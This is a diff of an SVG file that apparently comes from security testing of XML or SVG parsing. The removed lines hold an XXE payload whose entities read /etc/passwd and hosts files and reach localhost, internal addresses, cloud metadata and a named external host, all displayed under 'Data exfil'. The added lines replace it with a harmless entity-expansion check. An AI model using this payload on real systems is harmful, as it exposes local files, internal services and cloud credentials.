@@ -1,23 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY passwd SYSTEM "file:///etc/passwd">
-  <!ENTITY hosts SYSTEM "file:///etc/hosts">
-  <!ENTITY windows SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
-  <!ENTITY internal1 SYSTEM "http://localhost:8080/admin">
-  <!ENTITY internal2 SYSTEM "http://127.0.0.1:22">
-  <!ENTITY internal3 SYSTEM "http://169.254.169.254/latest/meta-data/">
-  <!ENTITY internal4 SYSTEM "http://10.0.0.1/config">
-  <!ENTITY internal5 SYSTEM "https://ai.defcon.hspmp.philips.com/pmai/robots.txt">
+  <!ENTITY test "ENTITY_WORKS">
 ]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text>Data exfil</text>
-  <text>&passwd;</text>
-  <text>&hosts;</text>
-  <text>&windows;</text>
-  <text>&internal1;</text>
-  <text>&internal2;</text>
-  <text>&internal3;</text>
-  <text>&internal4;</text>
-  <text>&internal5;</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">
+  <text x="10" y="50">&test;</text>
 </svg>
-
